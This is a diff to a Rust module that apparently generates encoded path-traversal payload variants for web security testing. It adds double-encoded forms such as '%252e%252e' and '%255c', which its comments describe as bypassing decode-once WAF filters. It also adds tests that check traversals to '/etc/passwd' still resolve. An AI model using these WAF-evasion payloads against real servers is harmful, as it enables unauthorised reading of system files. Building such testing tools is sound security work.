@@ -105,7 +105,11 @@ fn enc_slash(rng: &mut Rng) -> &'static str {
     // to 33% (intended ~17%). Same applies to enc_dot below where `.`
     // appeared twice (50% identity instead of 25%). Both duplicates
     // are unintended over-representations of the identity form.
-    const OPTS: [&str; 5] = ["/", "%2f", "%252f", "%c0%af", "%5c"];
+    // `%255c` is the double-encoded back-slash twin of `%252f`:
+    // `%255c`→`%5c`→`\`→`/` under the two-pass + backslash-unify
+    // resolver view, so it folds to a separator while a decode-once
+    // WAF sees an opaque token (sound; gated by `still_resolves`).
+    const OPTS: [&str; 6] = ["/", "%2f", "%252f", "%c0%af", "%5c", "%255c"];
     OPTS[rng.below(OPTS.len())]
 }
 fn enc_dot(rng: &mut Rng) -> &'static str {
@@ -113,13 +117,20 @@ fn enc_dot(rng: &mut Rng) -> &'static str {
     OPTS[rng.below(OPTS.len())]
 }
 fn enc_dotdot(rng: &mut Rng) -> String {
-    match rng.below(7) {
+    match rng.below(9) {
         0 => "..".into(),
         1 => "%2e%2e".into(),
         2 => ".%2e".into(),
         3 => "%2e.".into(),
         4 => "....//".into(),
         5 => "..%00/".into(),
+        // Double-encoded traversal: `%252e` → `%2e` → `.` under a
+        // two-pass decoder. Sound — [`normalize`] decodes twice, so the
+        // segment folds to `..` and the target check still binds — and
+        // it specifically defeats the common "decode once, then block
+        // `..`/`%2e`" filter that a single-encoded form does not.
+        6 => "%252e%252e".into(),
+        7 => ".%252e".into(),
         _ => "..;/".into(),
     }
 }
@@ -177,7 +188,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
         _ => (all, false),
     };
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut out: Vec<EquivPayload> = Vec::new();
+    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);
 
     if !still_resolves(payload, payload) {
         return out;
@@ -199,10 +210,10 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
     }
 
     let mut attempts = 0;
-    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
+    while out.len() < cfg.max && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR {
         attempts += 1;
         let mut s = payload.to_string();
-        let mut rules: Vec<&'static str> = Vec::new();
+        let mut rules: Vec<&'static str> = Vec::with_capacity(8);
         if rng.chance(4, 5) {
             let n = rw_encode(&s, &mut rng);
             if n != s {
@@ -251,14 +262,7 @@ mod tests {
     use super::*;
 
     fn cfg(seed: u64) -> EquivConfig {
-        EquivConfig {
-            seed,
-            max: 48,
-            verify: true,
-            vary_delivery: true,
-            param: "q".into(),
-            force_delivery: None,
-        }
+        crate::grammar::equiv::test_cfg(seed, 48, "q")
     }
 
     #[test]
@@ -290,6 +294,44 @@ mod tests {
             "../../../etc/passwd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
         ));
+    }
+
+    #[test]
+    fn double_encoded_dotdot_is_sound_and_folds_to_target() {
+        // `%252e%252e` decodes `%252e`→`%2e`→`.` over the two-pass
+        // resolver view, so the traversal folds to the same path and
+        // the oracle accepts it — while a decode-once WAF still sees an
+        // opaque `%252e` and does not match a `..`/`%2e%2e` rule.
+        assert_eq!(
+            normalize("%252e%252e%2f%252e%252e%2fetc/passwd"),
+            "../../etc/passwd"
+        );
+        assert!(still_resolves(
+            "../../etc/passwd",
+            "%252e%252e/%252e%252e/etc/passwd"
+        ));
+        // ...and the single-decode view (what a one-pass WAF sees) is
+        // NOT yet a bare `..` — proving the bypass value, not just
+        // soundness.
+        assert!(!pct_decode("%252e%252e").contains(".."));
+    }
+
+    #[test]
+    fn generator_reaches_the_double_encoded_form() {
+        // Across seeds the lattice must actually emit a double-encoded
+        // traversal (wiring proof: the new enc_dotdot arm is live, not
+        // dead). Every emitted member is still oracle-sound.
+        let atk = "../../../etc/passwd";
+        let mut saw_double = false;
+        for seed in 0..64u64 {
+            for m in generate(atk, &cfg(seed)) {
+                assert!(still_resolves(atk, &m.payload), "unsound {:?}", m.payload);
+                if m.payload.contains("%252e%252e") {
+                    saw_double = true;
+                }
+            }
+        }
+        assert!(saw_double, "double-encoded dotdot never emitted");
     }
 
     #[test]
